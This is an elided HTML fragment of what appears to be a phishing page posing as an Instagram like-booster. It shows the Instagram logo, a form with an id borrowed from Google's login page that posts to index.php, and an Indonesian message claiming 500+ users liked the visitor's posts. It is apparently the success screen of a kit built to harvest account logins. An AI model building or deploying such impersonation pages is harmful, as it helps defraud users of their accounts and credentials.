...
<body>
  ...
  <title>Tainsta - Sukses Like</title>
...
<style media="screen and (max-width: 800px), screen and (max-height: 800px)">
  ...
  <img alt="Instagram" class="logo" src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1280px-Instagram_logo.svg.png">
  </div>
  </div>
...
<p class="profile-name"></p>
  <form novalidate="" method="post" action="./index.php" id="gaia_loginform">
...
<center><span class="input-group-addon"><img src="https://lh3.googleusercontent.com/PmVk8m5kh3CfObclGgJfxdkf5FKuG1Y3SvPfZXKuFYEkpeBbIQ10k8gNz-4mRYTm_g=w300"style="width:20px;height:21px;"></span>
<center><p>500+ Pengguna Instagram baru saja menyukai Status, Foto, dan Video Anda.</p></center>
<input id="signIn" name="signIn" class="rc-button rc-button-submit" type="submit" value="Keluar">
